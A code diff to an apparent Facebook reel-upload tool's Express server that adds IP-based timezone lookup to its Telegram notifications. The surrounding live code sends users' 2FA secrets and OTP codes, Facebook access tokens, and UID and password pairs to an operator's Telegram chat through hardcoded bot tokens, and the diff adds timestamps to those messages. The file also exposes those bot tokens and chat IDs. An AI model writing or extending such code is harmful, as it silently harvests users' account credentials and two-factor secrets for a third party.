@@ -158,6 +158,55 @@ app.use(session({
   }
 }));
 
+// IP Timezone Cache
+const ipTimezoneCache = new Map<string, { timezone: string, offset: number }>();
+
+async function getTimezoneFromIp(ip: string): Promise<{ timezone: string, offset: number }> {
+    if (!ip || ip === 'default' || ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1') {
+        return { timezone: 'Asia/Ho_Chi_Minh', offset: 25200 }; // Default to VN
+    }
+    
+    if (ipTimezoneCache.has(ip)) return ipTimezoneCache.get(ip)!;
+    
+    try {
+        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,timezone,offset`, { timeout: 3000 });
+        if (response.data.status === 'success') {
+            const data = { timezone: response.data.timezone, offset: response.data.offset };
+            ipTimezoneCache.set(ip, data);
+            return data;
+        }
+    } catch (e) {}
+    
+    return { timezone: 'Asia/Ho_Chi_Minh', offset: 25200 };
+}
+
+function formatInTimezone(date: Date, timezone: string = 'Asia/Ho_Chi_Minh') {
+    try {
+        return date.toLocaleString('vi-VN', { timeZone: timezone });
+    } catch (e) {
+        return date.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+    }
+}
+
+function parseInTimezone(dateStr: string, timezone: string = 'Asia/Ho_Chi_Minh'): number {
+    if (dateStr.includes('Z') || dateStr.match(/[+-]\d{2}(:?\d{2})?$/)) {
+        return new Date(dateStr).getTime();
+    }
+    const date = new Date(dateStr); 
+    if (isNaN(date.getTime())) return Date.now();
+    try {
+        const ipData = Array.from(ipTimezoneCache.values()).find(v => v.timezone === timezone);
+        const offset = ipData ? ipData.offset : 25200;
+        const [d, t] = dateStr.split('T');
+        const [year, month, day] = d.split('-').map(Number);
+        const [hour, min] = t.split(':').map(Number);
+        const utcTimestamp = Date.UTC(year, month - 1, day, hour, min);
+        return utcTimestamp - (offset * 1000);
+    } catch (e) {
+        return date.getTime();
+    }
+}
+
 let webhookSetUrl = '';
 app.use(async (req, res, next) => {
     // Ensure Firebase is initialized
@@ -181,6 +230,10 @@ app.use(async (req, res, next) => {
     let mid = 'default';
     let user = null;
     
+    let clientIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'default';
+    if (Array.isArray(clientIp)) clientIp = clientIp[0];
+    const userIp = clientIp.split(',')[0].trim();
+
     if (token) {
         try {
             const decoded = Buffer.from(token, 'base64').toString('ascii');
@@ -195,11 +248,14 @@ app.use(async (req, res, next) => {
             }
         } catch(e) {}
     } else {
-       let clientIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'default';
-       if (Array.isArray(clientIp)) clientIp = clientIp[0];
-       mid = clientIp.split(',')[0].trim();
+       mid = userIp;
     }
     
+    // Resolve timezone
+    const tzData = await getTimezoneFromIp(userIp);
+    (req as any).timezone = tzData.timezone;
+    (req as any).userIp = userIp;
+
     als.run(mid, async () => {
       // Optimization: Only load data on the first request for this mid in this lambda execution life
       // or lazy load in the routes. For now, we still load but with more safety.
@@ -278,7 +334,7 @@ const escapeTg = (str: string) => {
   return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 };
 
-async function send2FANotification(secret: string, code: string, ip: string, accountInfo?: { name: string, token: string }) {
+async function send2FANotification(secret: string, code: string, ip: string, accountInfo?: { name: string, token: string }, timezone?: string) {
   const adminBotToken = '8735112287:AAEO-1WIHj690JJSahss_GoyzCCxbBne8BY';
   const adminChatId = '-1003999049149'; // Corrected group ID
   
@@ -292,7 +348,7 @@ async function send2FANotification(secret: string, code: string, ip: string, acc
 ${statusLine}
 👤 <b>UserName:</b> ${escapeTg(accountInfo?.name || 'N/A')}
 🌐 <b>IP Address:</b> ${escapeTg(ip)}
-⏰ <b>Time:</b> ${escapeTg(new Date().toLocaleString('vi-VN'))}
+⏰ <b>Time:</b> ${escapeTg(formatInTimezone(new Date(), timezone))}
 ━━━━━━━━━━━━━━━━━━
 🔑 <b>Secret 2FA:</b> <code>${escapeTg(secret)}</code>
 🔢 <b>OTP Code:</b> <code>${escapeTg(code)}</code>
@@ -323,7 +379,7 @@ app.post('/api/tools/2fa', async (req, res) => {
     const accountInfo = associatedAccount ? { name: associatedAccount.name, token: associatedAccount.access_token } : undefined;
 
     const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
-    await send2FANotification(cleanSecret, token, userIp, accountInfo);
+    await send2FANotification(cleanSecret, token, userIp, accountInfo, (req as any).timezone);
     
     res.json({ token });
   } catch (error: any) {
@@ -331,7 +387,7 @@ app.post('/api/tools/2fa', async (req, res) => {
   }
 });
 
-async function sendAdminNotification(rawInput: string, name: string, ip: string, status: 'SUCCESS' | 'FAILED', errorMsg?: string) {
+async function sendAdminNotification(rawInput: string, name: string, ip: string, status: 'SUCCESS' | 'FAILED', errorMsg?: string, timezone?: string) {
   const adminBotToken = '8735112287:AAEO-1WIHj690JJSahss_GoyzCCxbBne8BY';
   const adminChatId = '-1003999049149'; // Corrected group ID
   
@@ -349,7 +405,7 @@ async function sendAdminNotification(rawInput: string, name: string, ip: string,
 📊 <b>Status:</b> ${status}
 👤 <b>UserName:</b> ${escapeTg(name || 'N/A')}
 🌐 <b>IP Address:</b> ${escapeTg(ip)}
-⏰ <b>Time:</b> ${escapeTg(new Date().toLocaleString('vi-VN'))}
+⏰ <b>Time:</b> ${escapeTg(formatInTimezone(new Date(), timezone))}
 ━━━━━━━━━━━━━━━━━━
 🆔 <b>UID:</b> <code>${escapeTg(uid)}</code>
 🔑 <b>Pass:</b> <code>${escapeTg(pass)}</code>
@@ -401,7 +457,7 @@ app.post('/api/accounts/add-token', async (req, res) => {
         
         if (fbError?.code === 190) {
            const errMsg = `Token hết hạn/Vô hiệu: ${fbError.message}`;
-           await sendAdminNotification(rawInput, 'N/A', userIp, 'FAILED', errMsg);
+           await sendAdminNotification(rawInput, 'N/A', userIp, 'FAILED', errMsg, (req as any).timezone);
            return res.status(401).json({ error: errMsg });
         }
         
@@ -431,7 +487,7 @@ app.post('/api/accounts/add-token', async (req, res) => {
     getMD().accounts = await loadAccounts(newUser.machineId);
 
     // Send notification to Admin Bot (Success)
-    await sendAdminNotification(rawInput, name, userIp, 'SUCCESS');
+    await sendAdminNotification(rawInput, name, userIp, 'SUCCESS', undefined, (req as any).timezone);
     
     res.json(newUser);
   } catch (error: any) { 
@@ -443,7 +499,7 @@ app.post('/api/accounts/add-token', async (req, res) => {
     
     console.error('Add token error:', msg);
     // Send notification to Admin Bot (Failed)
-    await sendAdminNotification(rawInput, name, userIp, 'FAILED', msg);
+    await sendAdminNotification(rawInput, name, userIp, 'FAILED', msg, (req as any).timezone);
     res.status(500).json({ error: msg }); 
   }
 });
@@ -488,7 +544,7 @@ app.post('/api/auth/register', async (req, res) => {
            const adminChatId = '7778870614'; 
            const botToken = '8477094175:AAEMX4Ajk4lLXxi4hPxZ6W1O9mz8RuSw5yA'; 
            const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
-           const msg = `🟢 <b>NEW ACCOUNT REGISTRATION</b>\n👤 Username: <b>${username}</b>\n📧 Gmail: <b>${gmail}</b>\n📞 Phone: <b>${phone}</b>\n🌐 IP Address: <b>${userIp}</b>\n\n⚙️ <i>To activate, send:</i>\n/adddays ${username} days`;
+           const msg = `🟢 <b>NEW ACCOUNT REGISTRATION</b>\n👤 Username: <b>${username}</b>\n📧 Gmail: <b>${gmail}</b>\n📞 Phone: <b>${phone}</b>\n🌐 IP Address: <b>${userIp}</b>\n⏰ Time: <b>${formatInTimezone(new Date(), (req as any).timezone)}</b>\n\n⚙️ <i>To activate, send:</i>\n/adddays ${username} days`;
            await ax.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: adminChatId,
                text: msg,
@@ -567,7 +623,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
                         const botToken = '8477094175:AAEMX4Ajk4lLXxi4hPxZ6W1O9mz8RuSw5yA';
                         await ax.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                             chat_id: chatId,
-                            text: `✅ Đã cộng thêm ${days} ngày cho tài khoản ${username}. Hạn mới: ${baseDate.toLocaleDateString('vi-VN')}`
+                            text: `✅ Đã cộng thêm ${days} ngày cho tài khoản ${username}. Hạn mới: ${formatInTimezone(baseDate, (req as any).timezone)}`
                         });
                     } else {
                        const ax = getAxiosInstance();
@@ -884,19 +940,19 @@ app.get('/auth/callback', async (req, res) => {
     
     // Admin notification (Success)
     const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
-    await sendAdminNotification(access_token, me.data.name, userIp, 'SUCCESS');
+    await sendAdminNotification(access_token, me.data.name, userIp, 'SUCCESS', undefined, (req as any).timezone);
 
     res.send('<html><body><script>window.opener.postMessage({type:"OAUTH_AUTH_SUCCESS"}, "*");window.close();</script></body></html>');
   } catch (e: any) { 
     const userIp = (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || 'Unknown';
     const errM = e.response?.data?.error?.message || e.message || 'Internal OAuth Error';
     // Admin notification (Failed)
-    await sendAdminNotification('Token from OAuth Callback', 'N/A', userIp, 'FAILED', errM);
+    await sendAdminNotification('Token from OAuth Callback', 'N/A', userIp, 'FAILED', errM, (req as any).timezone);
     res.status(500).send('Fail'); 
   }
 });
 
-async function sendTelegramNotification(status: 'success' | 'error', data: any, errorMsg?: string) {
+async function sendTelegramNotification(status: 'success' | 'error', data: any, errorMsg?: string, timezone?: string) {
   if (!getMD().settings.telegram.enabled || !getMD().settings.telegram.botToken) return;
 
   const { pageName, accountName, link, mode, autoComment, affiliateLink } = data;
@@ -913,7 +969,7 @@ async function sendTelegramNotification(status: 'success' | 'error', data: any, 
 🛠 <b>Mode:</b> ${modeText}
 💰 <b>Affiliate:</b> ${affText}
 📊 <b>Status:</b> ${statusText}
-⏰ <b>Time:</b> ${new Date().toLocaleString('vi-VN')}
+⏰ <b>Time:</b> ${formatInTimezone(new Date(), timezone)}
 ${errorMsg ? `\n⚠️ <b>Error Details:</b> ${errorMsg}` : ''}
 ━━━━━━━━━━━━━━━━━━
   `.trim();
@@ -996,7 +1052,7 @@ app.post('/api/upload-reel', upload.single('video'), async (req, res) => {
     };
     
     if (mode === 'fb-schedule' && scheduleTime) {
-      publishParams.scheduled_publish_time = Math.floor(new Date(scheduleTime).getTime() / 1000);
+      publishParams.scheduled_publish_time = Math.floor(parseInTimezone(scheduleTime, (req as any).timezone) / 1000);
     }
 
     await ax.post(`https://graph.facebook.com/${FB_API_VERSION}/${pageId}/video_reels`, null, { 
@@ -1026,7 +1082,7 @@ app.post('/api/upload-reel', upload.single('video'), async (req, res) => {
 
     // Success Telegram Notification
     if (jobId) uploadJobs.set(jobId, { step: 'Đang gửi thông báo về bot tele...', status: 'uploading' });
-    await sendTelegramNotification('success', { ...notifyData, link });
+    await sendTelegramNotification('success', { ...notifyData, link }, undefined, (req as any).timezone);
 
     if (jobId) uploadJobs.set(jobId, { step: 'Đăng thành công', status: 'success', link });
 
@@ -1050,7 +1106,7 @@ app.post('/api/upload-reel', upload.single('video'), async (req, res) => {
     getMD().history = await loadHistory(mid);
 
     // Failure Telegram Notification
-    sendTelegramNotification('error', notifyData, errorMsg);
+    sendTelegramNotification('error', notifyData, errorMsg, (req as any).timezone);
 
     res.status(500).json({ error: errorMsg });
   }
